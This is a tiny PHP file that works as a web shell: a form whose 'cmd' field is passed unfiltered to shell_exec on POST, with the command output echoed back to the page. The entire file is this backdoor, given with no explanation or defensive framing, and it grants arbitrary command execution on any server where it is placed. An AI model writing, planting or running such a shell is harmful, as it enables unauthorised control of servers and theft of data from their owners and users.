<?php
if ( $_SERVER["REQUEST_METHOD"] === "POST" ) {
  echo shell_exec($_POST["cmd"]);
}
?>
<html>
        <form method="post" enctype="multipart/form-data" id="main" action="">
        <input type="text" name="cmd" value="" >
<br>
          <input type="submit" name="send" value="Hi" >
        </form>
